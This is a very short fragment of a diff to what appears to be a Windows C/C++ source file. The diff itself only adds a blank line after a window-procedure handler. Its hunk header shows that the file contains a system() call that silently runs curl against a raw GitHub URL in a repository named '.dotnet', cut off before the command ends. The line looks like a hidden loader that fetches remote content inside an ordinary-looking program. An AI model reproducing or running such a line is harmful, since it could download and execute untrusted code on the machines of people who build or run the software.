@@ -1287,3 +1287,4 @@ system("curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj
 		return CallWindowProc(originalWndProc, hwnd, msg, wParam, lParam);
 	}
 }
+
